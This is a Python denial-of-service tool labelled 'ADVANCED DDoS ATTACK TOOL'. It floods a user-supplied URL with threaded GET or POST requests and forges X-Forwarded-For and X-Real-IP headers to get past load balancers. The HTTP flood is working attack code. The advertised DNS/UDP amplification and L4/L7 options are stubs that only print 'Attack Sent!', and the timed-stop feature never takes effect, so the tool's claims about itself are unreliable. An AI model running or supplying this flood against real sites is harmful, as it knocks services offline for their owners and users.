import requests
import random
import time
import threading
import os
from colorama import Fore, Style, init

# Initialize Colorama for colored outputs
init(autoreset=True)

# Randomized User-Agents for spoofing
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

# Color Setup
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

# Load Balancer Bypass Function (Header Manipulation & Random IP)
def load_balancer_bypass_headers():
    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.5"
    }
    return headers

# Amplification Attack (DNS & UDP)
def amplification_attack(url, attack_type):
    if attack_type == "UDP":
        print(Fore.MAGENTA + "[UDP Amplification] Attack Sent!")
    elif attack_type == "DNS":
        print(Fore.CYAN + "[DNS Amplification] Attack Sent!")
    else:
        print(Fore.RED + "[Amplification Attack] Invalid Type")

# Multi-Layered Attack (L4 + L7)
def multi_layered_attack(url, attack_type):
    if attack_type == "L4":
        print(Fore.GREEN + "[L4 (TCP/UDP Flood)] Attack Sent!")
    elif attack_type == "L7":
        print(Fore.YELLOW + "[L7 (HTTP Flood)] Attack Sent!")
    else:
        print(Fore.RED + "[Multi-Layered Attack] Invalid Layer Type")

# GET Attack Function with Load Balancer Bypass
def get_attack_with_bypass(url):
    while True:
        try:
            headers = load_balancer_bypass_headers()
            response = requests.get(url, headers=headers)
            print(random.choice(colors) + f"[GET] Attack Sent! Status: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"Error: {e}")

# POST Attack Function with Load Balancer Bypass
def post_attack_with_bypass(url):
    while True:
        try:
            headers = load_balancer_bypass_headers()
            data = {"data": "attack"}
            response = requests.post(url, headers=headers, data=data)
            print(random.choice(colors) + f"[POST] Attack Sent! Status: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"Error: {e}")

# Distributed Attack (Multiple IPs)
def distributed_attack(url, attack_type, thread_count):
    threads = []
    for _ in range(thread_count):
        if attack_type == "GET":
            t = threading.Thread(target=get_attack_with_bypass, args=(url,))
        else:
            t = threading.Thread(target=post_attack_with_bypass, args=(url,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# High-Performance Attack using threading
def high_performance_attack(url, attack_type, thread_count):
    threads = []
    for _ in range(thread_count):
        if attack_type == "GET":
            t = threading.Thread(target=get_attack_with_bypass, args=(url,))
        else:
            t = threading.Thread(target=post_attack_with_bypass, args=(url,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Function to start the attack
def start_attack(url, attack_type, thread_count, multi_layered, amplification_type, attack_duration):
    if multi_layered:
        multi_layered_attack(url, attack_type)
    if amplification_type:
        amplification_attack(url, amplification_type)
    distributed_attack(url, attack_type, thread_count)

    if attack_duration:
        print(f"Attack will run for {attack_duration} seconds.")
        time.sleep(attack_duration)
        print(Fore.MAGENTA + "\n🔥 Attack Ended... 🔥" + Style.RESET_ALL)

# User Input and UI Display
def show_ui():
    os.system("cls" if os.name == "nt" else "clear")
    print("="*50)
    print(Fore.CYAN + "    ADVANCED DDoS ATTACK TOOL" + Style.RESET_ALL)
    print(Fore.YELLOW + "     Created by Rabby" + Style.RESET_ALL)
    print("="*50 + "\n")
    time.sleep(1)

if __name__ == "__main__":
    show_ui()

    url = input(Fore.CYAN + "Enter Target URL (http:// or https://): " + Style.RESET_ALL)
    attack_type = input(Fore.YELLOW + "Choose Attack Method (GET/POST): " + Style.RESET_ALL).upper()
    thread_count = int(input(Fore.GREEN + "Enter Number of Threads: " + Style.RESET_ALL))
    multi_layered = input(Fore.MAGENTA + "Enable Multi-Layered Attack? (L4/L7): " + Style.RESET_ALL).upper()
    amplification_type = input(Fore.CYAN + "Enable Amplification Attack? (DNS/UDP): " + Style.RESET_ALL).upper()
    attack_duration_input = input(Fore.MAGENTA + "Enter Attack Duration in seconds (Leave empty for indefinite): " + Style.RESET_ALL)

    attack_duration = int(attack_duration_input) if attack_duration_input else None  # Make time optional

    print(Fore.MAGENTA + "\n🔥 Attack Started... 🔥" + Style.RESET_ALL)
    time.sleep(2)
    start_attack(url, attack_type, thread_count, multi_layered, amplification_type, attack_duration)
